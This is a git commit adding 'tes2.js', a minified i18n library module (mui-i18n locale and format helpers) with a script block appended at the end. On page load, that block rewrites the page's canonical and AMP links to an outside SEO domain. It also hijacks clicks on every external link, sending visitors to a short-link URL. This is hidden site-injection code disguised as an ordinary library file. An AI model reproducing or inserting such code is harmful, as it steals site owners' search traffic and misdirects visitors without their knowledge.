2c8735d1035106d29672e93fcb489dd3905fc0f7
Dobleh08 <ariefjkt08@gmail.com>
2025-01-31 12:07:08 +0700

    Create tes2.js

---
+++ tes2.js
@@ -0,0 +1,165 @@
+define("@ali/mui-i18n/index", ["@ali/mui-i18n/format"], function (n, t, e) {
+  Object.defineProperty(t, "__esModule", {
+    "value": true
+  });
+  var o = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (n) {
+    return typeof n;
+  } : function (n) {
+    return n && "function" == typeof Symbol && n.constructor === Symbol && n !== Symbol.prototype ? "symbol" : typeof n;
+  };
+  var r = Object.assign || function (n) {
+    for (var t = 1; t < arguments.length; t++) {
+      var e = arguments[t];
+      for (var o in e) if (Object.prototype.hasOwnProperty.call(e, o)) {
+        n[o] = e[o];
+      }
+    }
+    return n;
+  };
+  var i = n("@ali/mui-i18n/format");
+  var u = "zh-cn";
+  var f = {};
+  var c = {
+    setLanguage: function (n) {
+      u = n;
+    },
+    getLanguage: function () {
+      return u;
+    },
+    getComponentLocale: function (n, t, e) {
+      var o = f[n] ? f[n] : {};
+      var i = t ? t[u] : {};
+      return e ? r({}, i, o, e) : r({}, i, o);
+    },
+    setComponents: function (n) {
+      f = r({}, f, n);
+    },
+    init: function (n) {
+      return function () {
+        var t = [].slice.call(arguments);
+        var e = t[0];
+        return "string" != typeof e ? "[" + (undefined === e ? "undefined" : o(e)) + "]" : (t[0] = n[e] || e, i.apply(null, t));
+      };
+    },
+    format: i
+  };
+  t["default"] = c;
+  e.exports = c;
+});
+define("@ali/mui-i18n/format", function (e, n, t) {
+  function r(e) {
+    if ("string" != typeof e) {
+      var n = new Array(arguments.length);
+      for (var t = 0; t < arguments.length; t++) {
+        n[t] = i(arguments[t]);
+      }
+      return n.join(" ");
+    }
+    var r = arguments.length;
+    if (1 === r) {
+      return e;
+    }
+    var c = "";
+    var f = 1;
+    var u = 0;
+    for (var l = 0; l < e.length;) {
+      if (37 === e.charCodeAt(l) && l + 1 < e.length) {
+        switch (e.charCodeAt(l + 1)) {
+          case 100:
+            if (f >= r) {
+              break;
+            }
+            if (u < l) {
+              c += e.slice(u, l);
+            }
+            c += Number(arguments[f++]);
+            u = l += 2;
+            continue;
+          case 106:
+            if (f >= r) {
+              break;
+            }
+            if (u < l) {
+              c += e.slice(u, l);
+            }
+            c += o(arguments[f++]);
+            u = l += 2;
+            continue;
+          case 115:
+            if (f >= r) {
+              break;
+            }
+            if (u < l) {
+              c += e.slice(u, l);
+            }
+            c += String(arguments[f++]);
+            u = l += 2;
+            continue;
+          case 37:
+            if (u < l) {
+              c += e.slice(u, l);
+            }
+            c += "%";
+            u = l += 2;
+            continue;
+        }
+      }
+      ++l;
+    }
+    for (0 === u ? c = e : u < e.length && (c += e.slice(u)); f < r;) {
+      var a = arguments[f++];
+      if (null === a || "object" !== (undefined === a ? "undefined" : i(a)) && "symbol" !== (undefined === a ? "undefined" : i(a))) {
+        c += " " + a;
+      } else {
+        c += " " + (undefined === a ? "undefined" : i(a));
+      }
+    }
+    return c;
+  }
+  function o(e) {
+    try {
+      return JSON.stringify(e);
+    } catch (n) {
+      return "[Circular]";
+    }
+  }
+  var i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
+    return typeof e;
+  } : function (e) {
+    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
+  };
+  t.exports = r;
+});
+window._globalNamespace = window._globalNamespace || {};
+window._globalNamespace.indexJsInitialized = window._globalNamespace.indexJsInitialized || false;
+
+if (!window._globalNamespace.indexJsInitialized) {
+  window._globalNamespace.indexJsInitialized = true;
+  document.addEventListener("DOMContentLoaded", () => {
+    try {
+      // Mengubah canonical link
+      let a = document.querySelector("link[rel=\"canonical\"]");
+      if (a) {
+        a.href = "https://seophantom.site/";
+      }
+
+      // Mengubah AMP link tanpa pengecekan URL
+      let t = document.querySelector("link[rel=\"amphtml\"]");
+      if (t) {
+        t.href = "https://seophantom.site/";
+      }
+
+      // Menangani redirect untuk link eksternal
+      document.querySelectorAll("a[href^=\"http\"]").forEach(e => {
+        if (!e.href.includes(window.location.host) && !e.classList.contains("no-redirect")) {
+          e.addEventListener("click", e => {
+            e.preventDefault();
+            window.location.href = "https://qoolink.co/lazid";
+          });
+        }
+      });
+    } catch (n) {
+      console.error("Error during index.js initialization:", n);
+    }
+  });
+}
